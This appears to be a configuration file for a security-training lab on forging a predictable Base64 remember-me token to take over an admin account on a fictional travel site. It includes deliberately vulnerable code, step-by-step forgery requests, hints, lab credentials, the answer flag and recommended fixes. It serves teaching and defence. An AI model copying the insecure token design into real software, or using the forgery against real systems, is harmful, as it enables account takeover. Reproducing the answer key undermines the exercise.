// src/modules/practice-labs/broken-auth/labs/lab2/lab2.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const brokenAuthLab2Metadata: LabMetadata = {
  slug: 'broken-auth-remember-me-token-forgery-travel',
  canonicalConceptId: 'broken-auth-predictable-token',
  environmentType: 'TRAVEL_BOOKING',
  title: 'Broken Auth: Predictable Remember-Me Token — Travel Booking Account Takeover',
  ar_title: 'Broken Auth: توكن Remember-Me قابل للتنبؤ — الاستيلاء على حساب حجز السفر',
  description:
    'Exploit a broken authentication vulnerability in a travel booking platform where the persistent "remember me" token is generated using a weak, predictable algorithm. Forge a valid remember-me token for an admin account and gain persistent access.',
  ar_description:
    'استغل ثغرة مصادقة مكسورة في منصة حجز سفر حيث يتم إنشاء توكن remember-me بخوارزمية ضعيفة وقابلة للتنبؤ. قم بتزوير توكن صالح لحساب المسؤول.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: ['Broken Authentication', 'Token Forgery', 'Predictable Token', 'Persistent Session Attack', 'Cryptographic Weakness'],
  xpReward: 240,
  pointsReward: 120,
  duration: 40,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  missionBrief: {
    codename: 'OPERATION GHOST COOKIE',
    classification: 'SECRET',
    objective: {
      en: 'Analyze your own remember-me cookie on FlyTrek to reverse-engineer the token generation algorithm, then forge an admin token and gain persistent access without any password.',
      ar: 'حلّل كوكي remember-me الخاص بك على FlyTrek لعكس خوارزمية توليد التوكن، ثم زوّر توكن أدمن واحصل على وصول دائم بدون كلمة مرور.',
    },
    successCriteria: {
      en: 'Access /admin/dashboard as admin@flytrek.io using only a forged remember-me token.',
      ar: 'صل إلى /admin/dashboard بوصفك admin@flytrek.io باستخدام توكن remember-me مزوَّر فقط.',
    },
  },

  labInfo: {
    vulnType: 'Broken Authentication — Predictable Token / Token Forgery',
    cweId: 'CWE-330',
    cvssScore: 8.1,
    whatYouLearn: {
      en: [
        'How predictable token generation enables session forgery',
        'Why Base64 is encoding (not encryption) and must never carry trusted identity data',
        'Token design principle: opaque random token → server-side DB lookup',
        'Mitigation: crypto.randomBytes(32) + DB-backed session store',
      ],
      ar: [
        'كيف يمكّن توليد التوكن القابل للتنبؤ من تزوير الجلسة',
        'لماذا Base64 هو ترميز (وليس تشفيراً) ويجب ألا يحمل بيانات هوية موثوقاً بها',
        'مبدأ تصميم التوكن: توكن عشوائي معتم → بحث في قاعدة بيانات الخادم',
        'التخفيف: crypto.randomBytes(32) + جلسة مدعومة بقاعدة بيانات',
      ],
    },
    techStack: ['REST API', 'Node.js', 'JWT', 'Base64', 'Cookie'],
    references: [
      'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html',
      'https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication',
      'https://cwe.mitre.org/data/definitions/330.html',
    ],
  },

  goal: 'Analyze your own remember-me token to discover the weak generation algorithm (Base64 of email:role:date). Forge a token for admin@flytrek.io with role "admin" and use it to access the admin dashboard.',
  ar_goal:
    'حلّل توكن remember-me الخاص بك لاكتشاف خوارزمية التوليد الضعيفة (Base64 لـ email:role:date). زوّر توكناً لـ admin@flytrek.io بدور "admin" واستخدمه للوصول إلى لوحة التحكم.',

  briefing: {
    en: `FlyTrek — travel booking platform. Flights, hotels, car rentals.
You logged in. You checked "Remember Me."
A cookie appears: rememberMe=bm91ckBmbHl0cmVrLmlvOnVzZXI6MTk3NDE=
You're a developer. You look at that string.
Base64.
You decode it.
nour@flytrek.io:user:19741
email:role:dayNumber.
The day number is Math.floor(Date.now() / 86400000).
The algorithm is in front of you.
admin@flytrek.io. Role: admin.
Base64("admin@flytrek.io:admin:19741").
One forged cookie.
Complete admin access.
No password needed.`,
    ar: `FlyTrek — منصة حجز سفر. رحلات، فنادق، تأجير سيارات.
سجّلت الدخول. اخترت "تذكّرني."
يظهر كوكي: rememberMe=bm91ckBmbHl0cmVrLmlvOnVzZXI6MTk3NDE=
أنت مطور. تنظر لتلك السلسلة.
Base64.
تفككها.
nour@flytrek.io:user:19741
email:role:dayNumber.
رقم اليوم هو Math.floor(Date.now() / 86400000).
الخوارزمية أمامك.
admin@flytrek.io. الدور: admin.
Base64("admin@flytrek.io:admin:19741").
كوكي مزوَّر واحد.
وصول كامل للمسؤول.
لا حاجة لكلمة مرور.`,
  },

  stepsOverview: {
    en: [
      'Login as traveler_nour → call /auth/get-remember-token → receive Base64 token',
      'Decode: Base64 → "nour@flytrek.io:user:<dayNumber>"',
      'Understand algorithm: Base64(email + ":" + role + ":" + Math.floor(Date.now()/86400000))',
      'Forge: Base64("admin@flytrek.io:admin:<today_day>")',
      'POST /auth/remember-login { "rememberToken": "<forged>" } → logged in as admin',
      'GET /admin/dashboard → flag',
    ],
    ar: [
      'سجّل الدخول كـ traveler_nour → استدعِ /auth/get-remember-token → استلم توكن Base64',
      'فك الترميز: Base64 → "nour@flytrek.io:user:<dayNumber>"',
      'افهم الخوارزمية: Base64(email + ":" + role + ":" + Math.floor(Date.now()/86400000))',
      'زوّر: Base64("admin@flytrek.io:admin:<today_day>")',
      'POST /auth/remember-login { "rememberToken": "<forged>" } → دخول كمسؤول',
      'GET /admin/dashboard → العلم',
    ],
  },

  solution: {
    context:
      'FlyTrek remember-me token = Base64(email:role:dayNumber). The server decodes and trusts the embedded email and role WITHOUT database validation. An attacker who understands the encoding can forge any admin token without knowing any password.',
    vulnerableCode:
      'function generateRememberToken(email: string, role: string): string {\n' +
      '  const day = Math.floor(Date.now() / 86400000);\n' +
      '  // ❌ Predictable: just Base64 of known values\n' +
      "  return Buffer.from(`${email}:${role}:${day}`).toString('base64');\n" +
      '}\n\n' +
      "app.get('/auth/remember-login', async (req, res) => {\n" +
      '  const token = req.cookies.rememberMe;\n' +
      '  // ❌ Trusts token-embedded claims without DB lookup!\n' +
      "  const [email, role] = Buffer.from(token, 'base64').toString().split(':');\n" +
      '  req.session.user = { email, role };\n' +
      '  res.json({ success: true });\n' +
      '});',
    exploitation:
      '1. Decode own token → "nour@flytrek.io:user:19741"\n' +
      '2. Forge: btoa("admin@flytrek.io:admin:19741")\n' +
      '3. POST /auth/remember-login { "rememberToken": "<forged>" } → admin session\n' +
      '4. GET /admin/dashboard → flag',
    steps: {
      en: [
        'POST /auth/login { "email": "nour@flytrek.io", "password": "nour123" }',
        'GET /auth/get-remember-token → Base64 token',
        'Decode token → pattern confirmed',
        'Use /auth/forge-token { "email": "admin@flytrek.io", "role": "admin" } → forged token',
        'POST /auth/remember-login { "rememberToken": "<forged>" } → admin session',
        'GET /admin/dashboard → FLAG{BROKEN_AUTH_PREDICTABLE_REMEMBER_ME_TOKEN_FORGED}',
      ],
      ar: [
        'POST /auth/login { "email": "nour@flytrek.io"، "password": "nour123" }',
        'GET /auth/get-remember-token → توكن Base64',
        'فك التوكن → تأكيد النمط',
        '/auth/forge-token { "email": "admin@flytrek.io"، "role": "admin" } → توكن مزوَّر',
        'POST /auth/remember-login { "rememberToken": "<forged>" } → جلسة مسؤول',
        'GET /admin/dashboard → FLAG{BROKEN_AUTH_PREDICTABLE_REMEMBER_ME_TOKEN_FORGED}',
      ],
    },
    fix: [
      'Use opaque random tokens: crypto.randomBytes(32) stored in DB — NEVER encode user identity in the token',
      'Server-side validation: always look up token in DB and retrieve identity from DB record',
      'Token expiry: 7-30 day max, single-use or rotated on each use',
      'HMAC signing: if token must contain data, sign with server secret',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Fatal flaw: encoding user identity in the token then trusting it without server-side verification. Base64 is encoding, not encryption — trivially reversible. A remember-me token must be an opaque random value pointing to server-stored session data.',
      ar: 'الخلل القاتل: ترميز هوية المستخدم في التوكن ثم الثقة بها دون تحقق من جانب الخادم. Base64 ترميز وليس تشفيراً.',
    },
    impact: {
      en: 'Persistent admin access: all bookings, payment data, loyalty points. Zero interaction from admin needed — just knowing the admin email is enough.',
      ar: 'وصول دائم للمسؤول: جميع الحجوزات، بيانات الدفع، نقاط الولاء. لا يتطلب أي تفاعل من المسؤول.',
    },
    fix: [
      'crypto.randomBytes(32): 256-bit entropy, zero semantic content',
      'DB-backed: { token_hash, userId, expiresAt } — identity only from DB',
      'Token rotation: new token on each use, old becomes invalid',
      '30-day absolute max + sliding expiry on activity',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      ar_content: 'سجّل الدخول واستدعِ /auth/get-remember-token. فكّ ترميز التوكن من Base64 (استخدم atob() أو Buffer.from(token, "base64").toString()). ماذا ترى بداخله؟',
      content: 'Login and call /auth/get-remember-token. Decode from Base64 (atob() or Buffer.from(token, "base64").toString()). What do you see inside?',
    },
    {
      order: 2,
      xpCost: 30,
      ar_content: 'التوكن هو Base64(email:role:dayNumber) حيث dayNumber = Math.floor(Date.now() / 86400000). هل تستطيع تطبيق نفس الصيغة لـ admin@flytrek.io بدور "admin"?',
      content: 'The token is Base64(email:role:dayNumber) where dayNumber = Math.floor(Date.now() / 86400000). Can you craft the same formula for admin@flytrek.io with role "admin"?',
    },
    {
      order: 3,
      xpCost: 55,
      ar_content: 'استخدم /auth/forge-token { "email": "admin@flytrek.io"، "role": "admin" } لتوليد التوكن المزوَّر. ثم POST /auth/remember-login { "rememberToken": "<forged_token>" } وصل إلى /admin/dashboard.',
      content: 'Use /auth/forge-token { "email": "admin@flytrek.io", "role": "admin" } to generate the forged token. Then POST /auth/remember-login and access /admin/dashboard.',
    },
  ],

  flagAnswer: 'FLAG{BROKEN_AUTH_PREDICTABLE_REMEMBER_ME_TOKEN_FORGED}',
  initialState: {
    users: [
      { username: 'traveler_nour', password: 'nour123', role: 'user', email: 'nour@flytrek.io' },
      { username: 'admin_flytrek', password: 'FLY_ADM1N_S3CR3T!', role: 'admin', email: 'admin@flytrek.io' },
    ],
  },
};
